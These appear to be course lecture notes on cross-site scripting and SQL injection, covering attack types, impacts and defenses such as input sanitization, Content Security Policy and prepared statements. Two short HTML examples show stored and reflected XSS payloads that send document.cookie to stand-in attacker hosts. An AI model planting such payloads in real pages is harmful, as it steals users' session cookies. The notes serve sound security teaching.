# XSS and SQL injection

## Ungraded Quiz

- use an example to explain how a stored XSS attack works
- use an example to explain how a SQL injection attack works

## Key concepts

### XSS: cross-site scripting

- injecting malicious scripts into HTML tags or or web pages 0 rendering the
  HTML causes the script to be executed

- _stored/persistent XSS_:

```HTML
Here is a picture of my dog <img id="mydogpic" src="dog.jpg">
  <script>document.getElementById("mydogpic").src="http://badsite.com/dog.jpg?arg1=" + document.cookie </script>
```

- _websites must sanitize input!_

- _reflected (non-persistent) XSS_:

```HTML
Our favorite site for deals is www.good.com:  <a href=’http://www.good.com/ <script>document.location="http://bad.com/dog.jpg?arg1="+document.cookie; </script>’> Click here </a>
```

- takes advantage of a site that returns 404 errors with
  `File-not-found: filepath-requested`

- _DOM-based XSS_

  - see [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

- [see Figure 9.6, page 264](https://people.scs.carleton.ca/~paulv/toolsjewels/TJrev1/ch9-rev1.pdf)

- for another source on XSS attacks, see
  [types of cross-site scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

- XSS impacts

  - once you allow an attacker to inject JavaScript, they can do a lot
  - browser redirection
  - access cookies
  - access browser-stored data for a website
  - rewrite the document being displayed
  - exploit browser vulnerabilities

- defenses
  - sanitize input by removing tags
  - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - server can specify which domains are allowed to execute scripts

### SQL Injection

- why a vulnerability exists

  - databases store information in tables
  - scripts construct SQL queries
  - scripts use input from cookies, variables, users

- SQL injection

  - crafting input so an attacker chooses an SQL command to be executed
  - extraction
  - modification
  - unauthorized account access
  - denial of service

- see
  [Examples, page 267 and 268](https://people.scs.carleton.ca/~paulv/toolsjewels/TJrev1/ch9-rev1.pdf)

- see [Example, page]

- defenses

  - _escaping_ problematic characters
  - _denylists_: filtering out denied commands
  - _positive validation_: only allowing certain commands

  - see
    [prepared statements, OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
